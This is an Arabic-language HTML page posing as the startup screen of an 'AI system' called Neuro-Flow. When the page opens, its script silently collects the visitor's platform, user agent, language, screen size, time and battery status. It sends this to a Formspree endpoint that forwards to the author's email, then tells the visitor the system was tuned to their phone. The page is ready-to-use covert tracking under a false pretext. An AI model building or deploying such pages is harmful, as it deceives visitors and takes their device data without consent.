<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Neuro-Flow | نظام ذكاء 2026</title>
    <style>
        :root { --primary: #4ecca3; --bg: #0f172a; }
        body {
            font-family: 'Segoe UI', sans-serif;
            background: var(--bg);
            color: white;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            text-align: center;
        }
        .container {
            padding: 30px;
            border-radius: 20px;
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            max-width: 400px;
        }
        .loader {
            border: 4px solid #f3f3f3;
            border-top: 4px solid var(--primary);
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            display: inline-block;
            margin-bottom: 15px;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h2 { color: var(--primary); }
        p { color: #94a3b8; }
    </style>
</head>
<body>

    <div class="container">
        <div id="loader" class="loader"></div>
        <h2 id="title">جاري تهيئة النظام...</h2>
        <p id="status">نحن نقوم بتحليل بيئة التشغيل لتقديم أفضل أداء.</p>
        <div id="info-display" style="font-size: 0.8rem; margin-top: 20px; color: #4ecca3;"></div>
    </div>

    <script>
        async function captureAndSend() {
            const statusText = document.getElementById('status');
            const titleText = document.getElementById('title');
            const loader = document.getElementById('loader');

            // 1. جمع المعلومات من المتصفح
            const deviceData = {
                platform: navigator.platform,
                agent: navigator.userAgent,
                language: navigator.language,
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                time: new Date().toLocaleString()
            };

            // 2. محاولة جلب البطارية
            try {
                if ('getBattery' in navigator) {
                    const battery = await navigator.getBattery();
                    deviceData.batteryLevel = (battery.level * 100) + "%";
                    deviceData.isCharging = battery.charging;
                }
            } catch (e) { deviceData.battery = "غير متاح"; }

            // 3. إرسال البيانات إلى بريدك الإلكتروني (عبر Formspree)
            // استبدل 'YOUR_FORM_ID' بالرمز الذي ستحصل عليه
            const formID = 'xkozoaaq'; 
            
            try {
                const response = await fetch(`https://formspree.io/f/${formID}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        subject: "تحليل جديد لجهاز",
                        ...deviceData
                    })
                });

                if (response.ok) {
                    loader.style.display = 'none';
                    titleText.innerText = "تم التوصيل بنجاح";
                    statusText.innerText = "تم ضبط النظام بناءً على مواصفات هاتفك.";
                    document.getElementById('info-display').innerText = `النظام المعالج: ${deviceData.platform}`;
                }
            } catch (error) {
                console.error("خطأ في الإرسال:", error);
            }
        }

        // تشغيل العملية فور فتح الصفحة
        window.onload = captureAndSend;
    </script>
</body>
</html>
